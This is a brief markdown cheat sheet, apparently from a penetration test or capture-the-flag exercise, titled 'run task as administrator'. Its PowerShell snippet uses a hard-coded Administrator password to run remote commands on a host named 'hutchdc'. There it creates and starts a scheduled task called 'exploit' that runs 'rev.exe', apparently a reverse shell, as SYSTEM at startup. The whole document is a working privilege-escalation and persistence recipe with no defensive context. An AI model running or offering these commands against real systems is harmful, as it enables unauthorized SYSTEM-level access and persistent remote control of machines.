# run task as administrator 

## requirements

- credentials

## task

```powershell
$pw = ConvertTo-SecureString "some_password" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn exploit /tr C:\windows\tasks\rev.exe /ru SYSTEM } -Credential $creds
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn exploit } -Credential $creds
```
